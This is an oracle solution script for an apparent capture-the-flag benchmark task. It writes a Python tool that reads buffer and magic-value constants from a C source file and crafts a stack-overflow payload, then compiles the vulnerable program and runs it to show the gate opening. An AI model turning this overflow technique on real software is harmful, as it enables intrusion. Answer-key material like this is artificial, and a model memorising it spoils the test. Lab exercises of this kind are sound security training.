#!/bin/bash
# Oracle for cinder-keeper: author /app/craft.py (the real deliverable), then
# run it on the visible source to produce /app/exploit.bin and confirm the
# gate opens. Never reads /tests.
set -eu

CRAFTER="/app/craft.py"

# ---- 1. Write the deliverable crafter (this IS the work).
cat > "$CRAFTER" <<'PY'
import re
import struct
import sys


def parse(source_path):
    with open(source_path, "r", encoding="utf-8", errors="replace") as fh:
        src = fh.read()

    m = re.search(r'#define\s+TAG_LEN\s+(\d+)\b', src)
    if not m:
        sys.exit("craft.py: no TAG_LEN define in %s" % source_path)
    tag_len = int(m.group(1))

    m = re.search(
        r'#define\s+PERMIT_MAGIC\s+(0[xX][0-9a-fA-F]+|\d+)[uUlL]*', src)
    if not m:
        sys.exit("craft.py: no PERMIT_MAGIC define in %s" % source_path)
    magic = int(m.group(1), 0)

    return tag_len, magic


def main():
    if len(sys.argv) != 3:
        sys.exit("usage: craft.py <keeper_source.c> <output_payload>")
    src_path, out_path = sys.argv[1], sys.argv[2]
    tag_len, magic = parse(src_path)

    if not (0 <= magic <= 0xFFFFFFFF):
        sys.exit("craft.py: PERMIT_MAGIC does not fit in 32 bits")

    payload = b"A" * tag_len + struct.pack("<I", magic)
    with open(out_path, "wb") as fh:
        fh.write(payload)


if __name__ == "__main__":
    main()
PY
chmod +x "$CRAFTER"

# ---- 2. Craft the visible payload and prove the gate opens.
python3 "$CRAFTER" /app/keeper.c /app/exploit.bin
gcc -O0 -o /tmp/keeper_visible /app/keeper.c
/tmp/keeper_visible < /app/exploit.bin

echo "solve.sh done -> $CRAFTER and /app/exploit.bin"
ls -l "$CRAFTER" /app/exploit.bin
